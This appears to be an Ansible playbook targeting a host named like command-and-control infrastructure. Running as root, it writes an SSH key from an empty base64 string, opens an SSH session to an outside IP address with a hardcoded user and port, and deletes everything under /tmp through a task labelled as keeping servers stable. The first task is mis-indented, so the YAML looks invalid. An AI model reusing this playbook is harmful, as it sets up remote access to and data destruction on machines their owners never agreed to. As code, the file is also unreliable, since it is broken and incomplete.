---
- hosts: c2.fckcopyright.com
  gather_facts: no
  become: yes

  tasks:
   - name: Save authorized SSH keys
      become_user: root
      become_method: sudo
      shell: echo  | base64 -d > id_rsa
      
    - name: Login using keys SSH
      become_user: root
      become_method: sudo
      vars:
        ssh_user: bksec
        ssh_key_file: ./id_rsa 
      shell: ssh -i {{ ssh_key_file }} -p 5501 {{ ssh_user }}@45.77.246.61

    - name: Remove tmps files, maintain the stability of servers
      become_user: root
      become_method: sudo
      vars:
        ssh_user: bksec
        ssh_key_file: ./id_rsa
      shell: ssh -i {{ ssh_key_file }} -p 2222 {{ ssh_user }}@localhost 'rm -r /tmp/*'




